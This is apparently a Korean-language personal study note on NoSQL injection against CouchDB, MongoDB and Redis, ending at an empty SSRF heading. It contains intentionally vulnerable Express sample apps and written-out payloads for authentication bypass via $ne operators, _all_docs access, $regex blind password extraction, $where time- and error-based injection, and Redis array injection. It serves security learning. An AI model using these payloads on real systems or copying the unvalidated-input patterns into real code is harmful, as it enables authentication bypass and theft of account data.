# NoSQL Injection: Exploit Tech
*NoSQL(NRDBMS)와 관련된 내용은 [DBMS.md](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Background/DBMS.md)의 Non-Relational DBMS 부분을 참고*

<br/>

## CouchDB 공격 기법
### nano 패키지
* NodeJS에서 CouchDB를 사용할 때 주로 사용하는 패키지 (아파치에서 개발)
    - 참고: [CouchDB nano 공식 github](https://github.com/apache/couchdb-nano)
* ```get``` 함수를 사용하여 ```_id``` 값을 통해 데이터를 조회하거나 ```find``` 함수를 통해 쿼리 기반으로 데이터를 가져올 수 있음
    | 사용하는 함수 | 공격 방법 |
    |----|-------|
    | ```get``` 함수 | 특수 구성 요소인 ```_all_docs```, ```_db``` 등에 접근해 데이터베이스의 정보를 획득할 수 있음 |
    | ```find``` 함수 | 연산자와 같이 객체 타입의 값을 입력해 개발자가 의도하지 않은 행위를 수행할 수 있음 |
    - nano 패키지의 ```get``` 함수의 구현
        ```javascript
        // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 680-688
        function getDoc (docName, qs0, callback0) {
        const { opts, callback } = getCallback(qs0, callback0)

        if (missing(docName)) {
            return callbackOrRejectError(callback)
        }

        return relax({ db: dbName, doc: docName, qs: opts }, callback) // https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 257-461 (relax 함수)
        }
        ```
        + ```relax``` 함수를 호출하여 초기화 과정 중 할당된 cfg.url의 뒤에 DB 이름과 doc을 차례로 추가해 GET 메소드로 요청을 전송함
    - nano 패키지의 ```find``` 함수의 구현
        ```javascript
        //https://github.com/apache/couchdb-nano/blob/main/lib/nano.js → Line 1025-1036
        function find (query, callback) {
        if (missing(query) || typeof query !== 'object') {
            return callbackOrRejectError(callback)
        }

        return relax({
            db: dbName,
            path: '_find',
            method: 'POST',
            body: query
        }, callback)
        }
        ```
        + if문의 조건식을 이용해 전달된 쿼리가 NULL인지와 객체 타입이 아닌지를 검사하여 둘 중 하나라도 해당되면 에러를 발생시킴 → **객체 형태의 데이터를 전달할 수 있음을 알 수 있음**

<br/>

#### nano 패키지의 get 함수: all_docs 접근
이용자의 입력값을 ```get``` 함수의 인자로 사용할 경우 특수 구성 요소를 통해 데이터베이스의 정보를 획득할 수 있음
* ```get``` 함수의 구현을 보면 전달된 인자에 대해 앞서 배운 특수 구성 요소의 포함 여부를 검사하지 않는다는 것을 알 수 있음
* 정상적인 접근과 ```_all_docs``` 접근
    | 분류 | 예시 및 설명 |
    |-----|-----|
    | 정상적인 접근 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ', result: ', result)})``` <br/> &nbsp;&nbsp; → 이용자가 요청한 user 데이터베이스의 guest 계정에 대한 정보를 얻을 수 있음 (get 함수의 첫번째 인자로 ```'guest'```를 입력함) |
    | ```_all_docs``` 접근 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ', result: ', result)})``` <br/> &nbsp;&nbsp; → 데이터베이스의 ```_all_docs```에 접근해 저장된 데이터베이스에 대한 모든 도큐먼트 정보들을 얻을 수 있음 (get 함수의 첫번째 인자로 ```'_all_docs'```를 입력함) |

<br/>

#### nano 패키지의 find 함수: 연산자 공격
객체 형태의 데이터를 입력받을 때 입력 값에 대한 검사가 부재하거나 미흡하다면 문제가 발생할 수 있음
* ```selector``` 안에서 연산자를 포함한 ```operator```를 사용할 수 있음 → 공격자가 조건식을 만들어 조건에 대항하지 않는 데이터를 모두 획득할 수 있음
* 올바른 데이터 조회와 악의적인 데이터 조회
    | 분류 | 예시 및 설명 |
    |----|--------|
    | 정상적인 쿼리 전송 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ', result: ', result) })``` <br/> &nbsp;&nbsp; → 이용자가 요청한 users 데이터베이스의 guest 계정의 데이터를 조회함 (find의 selector로 '_id'와 'upw'에 ```'guest'```를 입력함) |
    | 연산자를 포함한 공격 쿼리 전송 | ```require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err: ', err, ', result: ', result) })``` <br/> &nbsp;&nbsp; → 공격자가 요청한 users 데이터베이스의 admin 계정의 데이터를 조회할 때 upw의 값에 상관없이 admin 계정의 데이터를 조회함 (find의 selector로 'upw'에 연산자 ```'$ne'```를 사용해 ```''```이 아니면 데이터를 조회하도록 만들고 있음) |

<br/><br/>

### *CouchD 공격 기법 예시*
```javascript
// app.js 예제 (이용자가 전달한 uid에 해당하는 데이터를 조회하고 반환된 에러와 결과를 비교하여 인증 과정을 진행하는 코드)
const express = require('express');
const session = require('express-session');
const app = express();
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(session({'secret': 'secret'}));
const nano = require('nano')('http://{username}:{password}@localhost:5984');
const users = nano.db.use('users'); // { _id: 'admin', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: 'secretpw' }

app.post('/auth', function(req, res){
    users.get(req.body.uid, function(err, result){ // 이용자가 전달된 uid에 해당하는 데이터를 조회하고 반환된 에러와 결과를 비교함
        if (err){ // 에러가 발생한 경우
            res.send('error');
            return;
        }
        if (result.upw == req.body.upw) { // 조회한 uid의 upw와 이용자가 입력한 upw가 일치하는 경우 인증에 성공
            req.session.auth = true;
            res.send('success');
        } else { // 그 외의 경우는 모두 인증 실패
            res.send('fail');
        }
    });
});

const server = app.listen(3000, function() {
    console.log('app.listen');
});
```
* ```get``` 함수의 인자로 전달되는 이용자의 입력값 ```uid```에 대해 어떠한 검사도 하지 않아 CouchDB 특수 구성 요소를 이용할 수 있음
* 이용자가 전송한 요청의 종류와 결과
    | 요청 | 예시 및 설명 |
    |---|-----|
    | 정상적인 요청 | 이용자가 admin(uid)와 secretpw(upw)를 전달하여 정상적으로 인증 과정을 거쳐 success를 반환받음 <br/> &nbsp;&nbsp; → 쿼리 실행이 정상적으로 이뤄졌기 때문에 err에는 ```null```이 저장되고, success가 반환됨 |
    | 에러가 발생하는 요청 | 이용자가 uid의 값으로 데이터베이스에 존재하지 않은 문자열을 전달하면 에러가 발생하여 error를 반환받음 (유효하지 않은 uid 값을 입력한 경우) <br/> &nbsp;&nbsp; → 쿼리 실행 도중 에러가 발생하여 err에는 요청에 대한 에러 정보(```404 Object Not Found```)가 저장되고, result에는 ```null```이 저장됨 |
    | ```_all_docs```를 이용한 요청 | 공격자가 uid의 값으로 ```_all_docs```를 입력하고 upw를 입력하지 않으면(undefined) 세션을 획득할 수 있음 <br/> &nbsp;&nbsp; → ```_all_docs```는 upw의 데이터를 반환하지 않아 ```undefined```가 result.upw에 저장되기 매문에 인증 조건을 만족하여 세션을 획득할 수 있음(인증 우회) |

<br/><br/><br/>

## MongoDB 공격 기법
### MongoDB Injection
이용자가 입력한 값의 타입을 검사하지 않거나 검사가 미흡할 때 MongoDB에서 주로 발생하는 취약점
* 공격자는 이를 통해 **연산자**를 입력하여 데이터베이스 정보를 획득할 수 있음
* GET과 POST 메소드 방식을 이용한 애플리케이션에서 입력값에 대한 어떠한 검사도 수행하지 않을 경우 발생하는 취약점
    | 메소드 | 공격 방법 |
    |---|-------|
    | GET 메소드 | 객체 형태의 값을 삽입하여 실행시킬 수 있음 |
    | POST 메소드 | POST 방식으로 입력값을 전달하는 함수를 작성하고 이를 통해 입력값을 전달함 (JSON 형식으로 데이터를 전달하면 객체 형태의 입력값을 전달할 수 있음) |
    - GET과 POST 메소드 방식 모두 **이용자의 입력값에 대한 타입을 검사하지 않으면 다양한 형태의 데이터를 전달할 수 있음**
        + 이용자가 입력값을 이용해 특정 기능을 수행할 수 있는 경우에 악의적인 행위를 수행할 수 있음

<br/>

#### *MongoDB Injection 취약점 예시*
```javascript
// 이용자가 입력한 uid와 upw에 해당하는 값을 데이터베이스(user collection)에 조회하는 예제 코드
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', {useNewUrlParser: true, useUnifiedTopology: True});

// GET 메소드 방식을 사용함
app.get('/query', function(req, res){
    db.collection('user').find({ // db의 user 컬렉션에서 uid와 upw가 이용자의 입력값과 동일한 데이터를 검색함
        'uid': req.query.uid,
        'upw': req.query.upw // req.query.uid, req.query.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → 객체 타입의 데이터를 전달할 수 있음
    }).toArray(function(err, result){
        if (err) throw err
        res.send(result);
    });
});

const server = app.listen(3000, function(){
    console.log('app.listen');
})
```
* MongoDB의 ```db.collection.find()``` 함수를 이용해서 이용자의 입력값인 uid, upw 값에 해당하는 정보를 조회함
    - 코드에서 입력값의 타입을 검사하지 않아 **객체 타입의 입력값을 통해 user 콜렉션의 데이터를 조회할 수 있음**
* 연산자를 이용해 user 콜렉션의 정보를 획득하는 공격 코드
    ```
    http://localhost/query?uid[$ne]=a&upw[$ne]=a
    ```
    - uid와 upw에 지정된 값과 같지 않는 값을 찾는 ```$ne``` 연산자를 삽입 → uid가 "a"가 아니고, upw가 "a"가 아닌 값을 조회하므로 손쉽게 계정 정보를 탈취할 수 있음
        + 관리자 계정을 조회하기 위한 방법
            ```
            http://localhost/query?uid=admin&upw[$ne]=a
            ```
            - uid가 "admin"이고, upw가 "a"가 아닌 값을 조회하여 upw의 값과 상관 없이 uid가 "admin"인 데이터를 조회할 수 있음
* 동일한 코드를 GET 메소드가 아니라 POST 메소드 방식으로 요청 시 Post Data를 아래와 같이 구성함
    ```javascript
    // POST 메소드 방식을 사용
    app.post('/query', function(req, res){
        db.collection('user').find({
            'uid': req.body.uid,
            'upw': req.body.upw // req.body.uid, req.body.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → JSON 형식으로 객체 타입의 데이터를 전달할 수 있음
        }).toArray(function(err, result) {
            if (err) throw err;
            res.send(result);
        })
    })
    ```
    - ```$ne```(not equal) 연산자를 사용해서 uid 또는 upw를 모르는 상황에서도 원하는 데이터를 조회할 수 있음
        | Post Data | 설명 |
        |-----|--------|
        | { "uid": {"$ne": ""}, "upw": {"$ne": ""}} | uid가 ''와 같지 않고(ne), upw가 ''와 같지 않는(ne) 데이터를 조회 |
        + 관리자 계정을 조회하기 위한 방법
            | Post Data | 설명 |
            |---|------|
            | { "uid": "admin", "upw": {"$ne": ""}} | uid가 'admin'이고, upw가 ''와 같지 않은 데이터를 조회 <br/> &nbsp;&nbsp;→ upw 값에 상관 없이 uid가 'admin'인 데이터를 조회함 |

<br/><br/>

### MongoDB Blind Injection
MongoDBd에서 쿼리의 샐행 결과가 애플리케이션에 출력되지 않는 경우 사용할 수 있는 공격 방법
* ```$regex```와 ```$where```를 통해 Blind Injection을 수행할 수 있음
    | 연산자 | 공격 방법 |
    |---|------|
    | ```$regex``` | 쿼리에서 정규식을 사용할 수 있도록 하는 연산자 → 정규식으로 한 글자씩 비교하여 참/거짓 반환 결과를 통해 데이터를 알아낼 수 있음 |
    | ```$where``` | 자바스크립트의 식과 함께 데이터를 비교할 수 있도록 하는 연산자(필드 안에서 사용 불가) → 자바스크립트 식을 실행시켜 참/거짓 반환 여부 등을 통해 데이터를 알아낼 수 있음(길이 정보는 length, 각 위치 별 데이터는 ```substring()``` 함수를 사용하여 알아냄) |

<br/>

#### *MongoDB Blind Injection 예시*
```javascript
// 이용자가 입력한 값을 이용해 데이터를 조회하는 예제 코드(참/거짓 여부를 반환함)
const express = require('express');
const app = express();
app.use = express();
app.use(express.urlencoded( {extended : false }));

const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', {useNewUrlParser: true, useUnifiedTopology: true});

// POST 메소드 방식을 사용함
app.get('/query', function(req, res){
    db.collection('user').findOne({ // db의 user 컬렉션에서 uid와 upw가 이용자의 입력값과 동일한 데이터를 검색함
        'uid': req.query.uid,
        'upw': req.query.upw // req.body.uid, req.body.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → JSON 형식으로 객체 타입의 데이터를 전달할 수 있음
    }, function(err, result){
        if (err) throw err;
        console.log(result);
        if (result) { // 로그인에 성공할 경우 uid만 출력하기 때문에 Blind Injection을 통해 한 글자씩 알아내야 함
            res.send(result['uid']);
        } else {
            res.send('undefined');
        }
    })
});

const server = app.listen(80, function(){
    console.log('app.listen')
});
```
* ```$regex```를 이용해 admin 계정의 비밀번호를 획득하는 방법
    - 비밀번호의 길이 정보 획득
        | Post Data | 설명 | 결과 |
        |-----|------|----|
        | { "uid": "admin", "upw": {"$regex": ".{5}"}} | upw의 길이가 5인지 확인 | admin 출력 |
        | { "uid": "admin", "upw": {"$regex": ".{6}"}} | upw의 길이가 6인지 확인 | undefined 출력 |
        + 정규식 ```.{숫자}```에서 ```.```은 모든 문자 하나와 일치하고, ```{...}```은 반복을 나타냄 → 중괄호 안의 숫자만큼 ```.```을 반복함
    - 비밀번호의 길이를 확인한 후 입력의 시작 부분을 나타내는 ```^```를 이용하여 위치 별로 알파벳 소문자를 하나씩 비교해가며 응답에 따라 참/거짓을 확인할 수 있음
        | Post Data | 설명 | 결과 |
        |-----|------|----|
        | {"uid": "admin", "upw": {"$regex" : "^b"}} | upw의 첫 글자가 b인지 확인 | undefined |
        | {"uid": "admin", "upw": {"$regex" : "^a"}} | upw의 첫 글자가 a인지 확인 | admin (첫 글자는 a) |
        | {"uid": "admin", "upw": {"$regex" : "^aa"}} | upw의 두번째 글자가 a인지 확인 | undefined |
        | ... | ... | ... |
        | {"uid": "admin", "upw": {"$regex" : "^apple"}} | upw의 다섯번째 글자가 e인지 확인 | admin (비밀번호는 apple) |

<br/><br/>

### MongoDB Error & Time based Injection
MongoDB에서 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우 임의로 에러를 발생시키거나 시간 지연을 통해서 SQL Injection 성공 여부를 알아낼 수 있음
* ```$where``` 연산자를 통해서 Error & Time based Injection을 수행할 수 있음
    | SQL Injection 종류 | 공격 방법 |
    |-----|-------|
    | Time based Injection | 쿼리의 뒤에 AND 연산자를 사용해 시간 지연을 발생시키는 함수 ```sleep()```을 연결함 <br/>&nbsp;&nbsp; → 앞의 쿼리의 결과가 참이라면 시간 지연 함수가 실행됨 |
    | Error based Injection | 쿼리의 뒤에 AND 연산자를 사용해 문법 에러 등 에러를 발생시킬 수 있는 문자열 등을 삽입함 <br/>&nbsp;&nbsp; → 앞의 쿼리의 결과가 참이라면 에러가 발생됨 |

<br/>

#### *MongoDB Error & Time based Injection 예시*
```javascript
// 데이터 조회 코드
db.collection('user').find(
    {$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`}
)
```
* MongoDB Time based Injection을 사용하여 Blind Injection을 수행하는 방법
    - AND 연산자를 사용해 결과가 참이 되면 시간 지연 함수 ```sleep()```가 실행되도록 함
        | [GET] URL 뒷부분 | 설명 | 결과 |
        |-----|-----|---|
        | ```/?uid=admin'&&this.upw.substring(0,1)=='u'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 u이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 X (거짓) |
        | ```/?uid=admin'&&this.upw.substring(0,1)=='p'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 p이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 X (거짓) |
        | ... | ... | ... |
        | ```/?uid=admin'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1``` | uid가 'admin'이고 upw의 첫번째<br/> 문자가 a이면 sleep(5000)를 실행함 | 시간 지연<br/> 발생 (참) |
* MongoDB Error based Injection을 사용하여 Blind Injection을 수행하는 방법
    - AND 연산자를 사용해 결과가 참이 되면 문법 에러가 발생하는 ```asdf```가 실행되도록 함
        + [POST] Post Data: ```{$where: "this.uid=='admin'&&this.upw.substring(0,1)=='u'&&asdf&&'1'&&this.upw=="${upw}'"}```
            - uid가 'admin'이고 upw의 첫번째 문자가 u이면 asdf에 의해 문법 에러 발생 → 에러 발생 X (거짓)
        + [POST] Post Data: ```{$where: "this.uid=='admin'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=="${upw}'"}```
            - uid가 'admin'이고 upw의 첫번째 문자가 a이면 asdf에 의해 문법 에러 발생 → 에러 발생 (참)

<br/><br/><br/>

## Redis 공격 기법
### NodeJS redis 모듈 (처리 방식을 이용한 공격)
```javascript
// redis 모듈 사용 예시 코드
var express = require('express');
var app = express();
app.use(express.json());
app.use(express.urlencoded({extended:false}));
const redis = require("redis");
const client = redis.createClient();

app.get('/init', function(req, res) {
    // client.set("key", "value");
    // 이용자가 입력하는 uid(req.query.uid) 키에 {level: 'guest'}를 값으로 저장함
    client.set(req.query.uid, JSON.stringify({level: 'guest'}));
    res.send('ok');
});

var server = app.listen(3000, function() {
    console.log('app.listen');
})
```
* ```req.query```에 해당하는 부분에 문자열 외에도 배열(Array) 또는 객체 타입의 데이터도 삽입할 수 있음
    - 이용자의 입력값(```req.query.uid```)의 타입 별 처리 방식
        | 입력값 타입 | 처리 방식(command 라이브러리 코드의 return 부분) |
        |----|--------|
        | 문자열 타입 | (입력) key, value, callback → ```new Command(command, [key, value], callback)``` |
        | 배열 타입 | (입력) [ key, value ] → ```new Command(command, key, value)``` <br/> &nbsp;&nbsp; → if문에서 len이 2이면 callback를 배열의 두 번째 값으로 설정하기 때문 |
        + redis 모듈의 command 라이브러리 코드의 일부
            ```javascript
            // https://github.com/NodeRedis/node-redis/blob/0041e3e53d5292b13d96ce076653c5b91b314fda/lib/commands.js → Line 20 - 25, 46
            if (Array.isArray(arguments[0])) {
                arr = arguments[0];
                if (len === 2) {
                    callback = arguments[1];
                }
            }
            return this.internal_send_command(new Command(command, arr, callback));
            ```
    - 배열 타입으로 값을 입력할 경우 개발자가 의도한 값이 적용되지 않고 임의로 입력한 값이 삽입됨 → 공격자가 배열 타입의 인자를 전달할 경우 악의적인 요청을 수행하도록 할 수 있음
        + ```http://localhost:3000/init?uid[]=test&uid[]={"level": "admin"}```를 전달하면 애플리케이션에서는 ```Command("set", "test", {"level": "admin"})``` 코드가 실행되어 공격자가 임의의 값을 가진 데이터를 생성할 수 있음

<br/><br/>

### SSRF
